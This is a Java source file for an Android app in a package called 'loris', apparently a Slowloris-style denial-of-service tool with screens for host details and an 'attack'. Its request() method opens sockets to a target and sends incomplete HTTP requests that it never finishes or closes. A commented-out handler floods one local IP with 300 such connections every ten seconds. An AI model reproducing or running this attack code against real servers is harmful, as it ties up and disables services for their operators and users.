package ch.abertschi.loris;

import android.annotation.SuppressLint;
import android.os.Looper;
import android.os.Message;
import android.support.design.widget.TabLayout;
import android.support.v4.app.Fragment;
import android.support.v4.view.ViewPager;
import android.support.v7.app.ActionBar;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.os.Handler;
import android.view.MotionEvent;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.view.animation.TranslateAnimation;
import android.widget.ImageView;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

/**
 * An example full-screen activity that shows and hides the system UI (i.e.
 * status bar and navigation/system bar) with user interaction.
 */
public class FullscreenActivity extends AppCompatActivity {

    private View mContentView;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_fullscreen);

        List<Fragment> fragments = new ArrayList<>();
        fragments.add(TabHostDetails.newInstance());
        fragments.add(TabAttackConfirm.newInstance());
        fragments.add(TabAttack.newInstance());

        FragmentAdapter adapter = new FragmentAdapter(getSupportFragmentManager(), fragments);
        ViewPager viewPager = (ViewPager) findViewById(R.id.viewpager);
        viewPager.setAdapter(adapter);


        mContentView = findViewById(R.id.fullscreen_content);
//        mContentView.setOnTouchListener(new View.OnTouchListener() {
//            @Override
//            public boolean onTouch(View v, MotionEvent event) {
//
//                Thread thread = new Thread(new Runnable() {
//
//                    @Override
//                    public void run() {
//                        try {
//                            while (true) {
//                                for (int i = 0; i < 300; i++) {
//                                    System.out.println("Creating " + i);
//                                    request("192.168.0.248", 80);
//                                }
//                                System.out.println("sleeping");
//                                Thread.sleep(10000);
//                            }
//                        } catch (Exception e) {
//                            e.printStackTrace();
//                        }
//                    }
//                });
//
//                thread.start();
//
//
//                return false;
//            }
//        });
        fullScreen();


        View enterLayout = findViewById(R.id.enter);
//        Animation animation = new TranslateAnimation(0, 4000 ,0, 0); //May need to check the direction you want.
//        animation.setDuration(1000);
//        animation.setRepeatMode(Animation.INFINITE);
//        animation.setStartOffset(1000);
//        animation.setFillAfter(true);

//        enterLayout.startAnimation(animation);
//        enterLayout.setVisibility(View.GONE);


    }

    private void fullScreen() {
        mContentView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LOW_PROFILE
                | View.SYSTEM_UI_FLAG_FULLSCREEN
                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
        );
    }

    @Override
    protected void onResume() {
        super.onResume();
        fullScreen();
    }


    private static void request(String ip, int port) {
        Socket socket = null;
        try {
            socket = new Socket(InetAddress.getByName(ip), port);
//            socket.setSoTimeout(10);
            PrintWriter writer = new PrintWriter(socket.getOutputStream());
            writer.println("GET /?100 HTTP/1.1");
            writer.println(String.format("Host: %s", ip));
//            pw.print("\r\n\r\n");
            writer.flush();
//            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    public static void main(String[] args) {

    }
};
